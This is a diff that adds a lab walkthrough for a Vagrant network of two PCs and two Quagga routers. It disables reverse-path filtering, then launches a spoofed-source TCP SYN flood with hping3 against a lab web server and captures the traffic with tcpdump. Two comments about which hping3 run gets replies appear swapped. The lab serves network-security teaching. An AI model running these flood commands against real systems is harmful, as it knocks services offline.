@@ -1,0 +1,55 @@
+pc1: 192.168.1.1
+pc2: 192.168.2.1
+router1 enp0s8: 192.168.1.254
+router1 enp0s9: 192.168.100.1
+router2 enp0s8: 192.168.2.254
+router2 enp0s9: 192.168.100.2
+
+
+stand up all machines and make sure quagga services are started
+host:$ vagrant up
+
+host:$ vagrant ssh attacker-router
+attacker-router:$ sudo /etc/init.d/quagga start
+
+host:$ vagrant ssh defender-router
+defender-router:$ sudo /etc/init.d/quagga start
+
+PING TEST
+host:$ vagrant ssh attacker
+pc1-vm:$ ping 192.168.2.1
+
+TRACEROUTE TEST
+pc1-vm:$ sudo traceroute 192.168.2.1
+
+# check that we have strict mode rpf OFF on router 1 and router 2
+router[1|2}-vm:$ sudo sysctl -ar '\.rp_filter'
+
+# create a simple web server
+pc2-vm:$ sudo python3 -m http.server 80
+
+# open up the firewall to allow port 80 traffic
+pc2-vm:$ sudo ufw allow 80/tcp 
+
+# Verify you can openssl to pc2:
+pc1-vm:$ openssl s_client -connect 192.168.2.1:80
+
+# demonstrate that you can recieve SA replies
+pc1-vm:$ sudo hping3 -V -c 10 --rand-source -S -p 80 192.168.2.1
+
+# demonstrate that you can send with random sources and get no SA replies
+pc1-vm:$ sudo hping3 -V -c 10 -S -p 80 192.168.2.1
+
+# start tcpdump on pc2 (need to open a new session) and write it to a file:
+pc2-vm:$ sudo tcpdump -i enp0s8 -n 'tcp[tcpflags] & tcp-syn != 0'
+
+# launch attack !!!! BEWARE !!!! - Do NOT launch an attack without understanding the consequences
+pc1-vm:$ sudo hping3 -V --rand-source --flood -S -p 80 192.168.2.1
+
+# relaunch attack but save pcap on pc2
+pc2-vm:$ sudo tcpdump -i enp0s8 -n 'tcp[tcpflags] & tcp-syn != 0' -w /vagrant/capture.pcap
+
+# copy the pcap to your host machine
+HOST:$ scp -i <path to your project folder>/.vagrant/machines/defender/virtualbox/private_key -P 2200 vagrant@127.0.0.1:/vagrant/capture.pcap .
+
+
